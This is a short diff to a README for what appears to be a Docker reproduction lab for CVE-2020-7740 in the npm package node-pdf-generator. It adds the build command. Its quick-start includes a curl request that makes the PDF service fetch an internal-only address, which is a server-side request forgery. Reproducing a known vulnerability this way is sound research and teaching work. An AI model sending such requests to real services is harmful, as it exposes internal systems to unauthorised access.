@@ -6,7 +6,7 @@ This affects all versions of package [`node-pdf-generator`](https://github.com/d
 
 ## Quick start with docker
 
-1. Build the container with
+1. Build the container with `docker build --platform linux/amd64 -t cve-2020-7740 .`
 2. Run the container with `docker run -p 3000:3000 cve-2020-7740`
 3. Notice that we cannot visit [`localhost:3001`](http://localhost:3001) directly
 4. Send the request with curl using `curl --location --request GET localhost:3000/test --data-raw http://localhost:3001 --output test.pdf`
